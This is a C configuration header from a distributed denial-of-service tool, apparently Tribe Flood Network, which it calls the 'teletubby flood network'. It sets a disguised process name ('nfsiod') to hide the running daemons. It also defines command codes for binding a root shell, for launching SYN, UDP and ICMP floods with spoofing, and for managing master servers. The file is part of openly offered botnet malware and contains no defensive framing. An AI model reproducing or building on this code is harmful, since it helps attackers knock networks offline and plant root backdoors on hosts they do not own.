#ifndef _CONFIG_H

/* user defined values for the teletubby flood network */

#define HIDEME "nfsiod"
#define HIDEKIDS "nfsiod"
#define CHILDS 1

/* These are like passwords, you might want to change them */

#define ID_SHELL   88	/* to bind a rootshell */

#define  ID_SETPRANGE 8008 /* set port range for synflood */
#define   ID_SETUSIZE 8009 /* set udp size */
#define   ID_SETISIZE 9010 /* set icmp size */
#define    ID_TIMESET 9011 /* set the flood time */
#define     ID_DIEREQ 6663 /* shutdown request of the masterserver */
#define   ID_DISTROIT 6662 /* distro request of the master server */
#define ID_REMMSERVER 5501 /* remove added masterserver */
#define ID_ADDMSERVER 5555 /* add new masterserver request */
#define ID_STEST  959       /* spoof test request by the floodserver */
#define ID_TEST  6268       /* test of the master server */
#define ID_ICMP  1155      /* to icmp flood */
#define ID_SENDUDP 6	   /* to udp flood */
#define ID_SENDSYN 9       /* to syn flood */
#define ID_SYNPORT 8	   /* to set port */
#define ID_STOPIT  3       /* to stop flooding */
#define ID_SWITCH  5       /* to switch spoofing mode */
#define ID_ACK     4	   /* for replies to the client */

#define _CONFIG_H
#endif
